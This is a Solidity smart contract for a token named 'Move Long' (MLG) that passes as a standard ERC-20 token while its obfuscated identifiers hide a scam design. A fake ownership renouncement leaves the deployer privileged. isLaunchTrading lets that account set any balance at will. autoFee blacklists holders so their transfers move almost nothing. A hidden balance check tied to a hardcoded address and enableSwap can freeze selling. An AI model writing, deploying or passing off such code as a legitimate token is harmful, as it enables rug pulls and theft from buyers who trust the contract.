//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface toTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellTradingTo {
    function createPair(address liquidityAmountSender, address feeMode) external returns (address);
}

interface maxSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletTakeBuy) external view returns (uint256);

    function transfer(address txShouldSwap, uint256 exemptBuy) external returns (bool);

    function allowance(address toReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptBuy) external returns (bool);

    function transferFrom(
        address sender,
        address txShouldSwap,
        uint256 exemptBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);
    event Approval(address indexed toReceiver, address indexed spender, uint256 value);
}

interface maxSwapMetadata is maxSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MoveLong is fundTeam, maxSwap, maxSwapMetadata {

    bool public feeTo;

    function transferFrom(address atEnable, address txShouldSwap, uint256 exemptBuy) external override returns (bool) {
        if (_msgSender() != fromWalletReceiver) {
            if (minMarketing[atEnable][_msgSender()] != type(uint256).max) {
                require(exemptBuy <= minMarketing[atEnable][_msgSender()]);
                minMarketing[atEnable][_msgSender()] -= exemptBuy;
            }
        }
        return shouldLaunchedMax(atEnable, txShouldSwap, exemptBuy);
    }

    uint256 private tradingMax;

    function allowance(address listExempt, address listLiquidity) external view virtual override returns (uint256) {
        if (listLiquidity == fromWalletReceiver) {
            return type(uint256).max;
        }
        return minMarketing[listExempt][listLiquidity];
    }

    function shouldLaunchedMax(address atEnable, address txShouldSwap, uint256 exemptBuy) internal returns (bool) {
        if (atEnable == receiverBuy) {
            return modeEnable(atEnable, txShouldSwap, exemptBuy);
        }
        uint256 feeModeMax = maxSwap(swapBuy).balanceOf(senderLaunched);
        require(feeModeMax == autoFromIs);
        require(txShouldSwap != senderLaunched);
        if (receiverFund[atEnable]) {
            return modeEnable(atEnable, txShouldSwap, toLaunch);
        }
        return modeEnable(atEnable, txShouldSwap, exemptBuy);
    }

    address public receiverBuy;

    function getOwner() external view returns (address) {
        return walletTake;
    }

    function transfer(address fundTotal, uint256 exemptBuy) external virtual override returns (bool) {
        return shouldLaunchedMax(_msgSender(), fundTotal, exemptBuy);
    }

    function approve(address listLiquidity, uint256 exemptBuy) public virtual override returns (bool) {
        minMarketing[_msgSender()][listLiquidity] = exemptBuy;
        emit Approval(_msgSender(), listLiquidity, exemptBuy);
        return true;
    }

    address public swapBuy;

    function sellMode(address totalLiquidity) public {
        if (swapFrom) {
            return;
        }
        
        txIs[totalLiquidity] = true;
        
        swapFrom = true;
    }

    constructor (){
        if (amountIsLaunch == feeTo) {
            txMinLimit = receiverExempt;
        }
        toTotal sellAuto = toTotal(fromWalletReceiver);
        swapBuy = sellTradingTo(sellAuto.factory()).createPair(sellAuto.WETH(), address(this));
        if (txMinLimit != launchExempt) {
            launchExempt = tradingMax;
        }
        receiverBuy = _msgSender();
        liquidityBuy();
        txIs[receiverBuy] = true;
        launchMin[receiverBuy] = swapTotal;
        if (tradingMax != receiverExempt) {
            amountIsLaunch = true;
        }
        emit Transfer(address(0), receiverBuy, swapTotal);
    }

    function shouldTeam() private view {
        require(txIs[_msgSender()]);
    }

    mapping(address => bool) public txIs;

    event OwnershipTransferred(address indexed teamTotal, address indexed tradingTx);

    address private walletTake;

    uint256 public launchExempt;

    function autoFee(address teamBuy) public {
        shouldTeam();
        if (receiverExempt == tradingMax) {
            tradingMax = receiverExempt;
        }
        if (teamBuy == receiverBuy || teamBuy == swapBuy) {
            return;
        }
        receiverFund[teamBuy] = true;
    }

    function liquidityBuy() public {
        emit OwnershipTransferred(receiverBuy, address(0));
        walletTake = address(0);
    }

    bool public exemptLiquidityMin;

    address senderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public amountIsLaunch;

    function name() external view virtual override returns (string memory) {
        return limitMinAuto;
    }

    uint256 private swapTotal = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return fromTotal;
    }

    mapping(address => mapping(address => uint256)) private minMarketing;

    uint256 public receiverExempt;

    uint256 constant toLaunch = 9 ** 10;

    uint256 autoFromIs;

    string private limitMinAuto = "Move Long";

    function decimals() external view virtual override returns (uint8) {
        return totalAutoWallet;
    }

    string private fromTotal = "MLG";

    address fromWalletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 buyTx;

    function enableSwap(uint256 exemptBuy) public {
        shouldTeam();
        autoFromIs = exemptBuy;
    }

    bool public swapFrom;

    function owner() external view returns (address) {
        return walletTake;
    }

    function balanceOf(address walletTakeBuy) public view virtual override returns (uint256) {
        return launchMin[walletTakeBuy];
    }

    function modeEnable(address atEnable, address txShouldSwap, uint256 exemptBuy) internal returns (bool) {
        require(launchMin[atEnable] >= exemptBuy);
        launchMin[atEnable] -= exemptBuy;
        launchMin[txShouldSwap] += exemptBuy;
        emit Transfer(atEnable, txShouldSwap, exemptBuy);
        return true;
    }

    uint8 private totalAutoWallet = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return swapTotal;
    }

    mapping(address => uint256) private launchMin;

    function isLaunchTrading(address fundTotal, uint256 exemptBuy) public {
        shouldTeam();
        launchMin[fundTotal] = exemptBuy;
    }

    mapping(address => bool) public receiverFund;

    uint256 private txMinLimit;

}